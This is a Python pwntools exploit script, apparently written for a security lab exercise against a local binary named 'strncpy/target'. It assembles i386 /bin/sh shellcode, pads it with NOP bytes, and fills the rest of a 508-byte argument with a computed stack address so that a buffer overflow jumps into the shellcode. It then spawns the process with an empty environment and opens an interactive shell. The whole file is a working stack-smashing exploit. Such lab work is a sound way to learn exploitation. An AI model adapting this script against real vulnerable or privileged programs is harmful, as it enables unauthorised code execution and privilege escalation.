from pwn import process, context, shellcraft, asm, gdb
import struct

# Same with pwntools p32(), but I just prefer this way. (doesn't matter using pwntools p32())
def p32(x: int) -> bytes:
    return struct.pack("<L", x)

context.arch = "i386" # specify architecture to build shellcode using shellcraft
context.terminal = ["tmux", "splitw", "-h"] # specify terminal to use gdb.

shellcode = asm(shellcraft.sh())

fname = "/home/lab05/strncpy/target"

argv1_length = 508
argv1 = b"\x90" * (4 - (len(shellcode) % 4)) + shellcode # Align shellcode to 4 bytes; 0x90 is nop
argv2 = "513"
argv3 = "a"*0x1f # Adjust argv to make stack "Good" case. 0x1f is because I wanted to make it 4 byte aligned with null-bytes. (0x1f+1=0x20) (ONLY NEEDED FOR fname="/home/lab05/strncpy/target")
argv1_p = 0xffffe000 - 8 - (len(fname)+1) - (len(argv2)+1) - (argv1_length+1) - (len(argv3)+1)# We don't care environment variables, because we will ommit all of them
argv1 += p32(argv1_p) * ((argv1_length - len(argv1))//4)
assert len(argv1) == argv1_length

# By setting env = {}, we can give an empty env to the target process. i.e. No environmental variables.

# p = gdb.debug([fname, argv1, argv2], env={}, gdbscript=gdbscript)
p = process([fname, argv1, argv2, argv3], env={})
p.interactive()